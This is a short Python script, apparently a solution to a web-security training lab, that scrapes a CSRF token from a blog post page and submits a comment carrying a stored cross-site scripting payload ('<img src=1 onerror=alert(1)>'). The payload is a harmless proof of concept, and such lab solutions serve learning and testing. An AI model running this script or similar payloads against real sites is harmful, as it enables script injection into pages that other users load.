import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
get_csrf_token = burp_url + '/post?postId=3'
comment = burp_url + '/post/comment'

session = requests.Session()

response = session.get(get_csrf_token)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"csrf": csrf, "postId": "3", "comment": "<><img src=1 onerror=alert(1)>", "name": "1", "email": "1@1.com", "website": ''}
session.post(comment, data=burp_data)
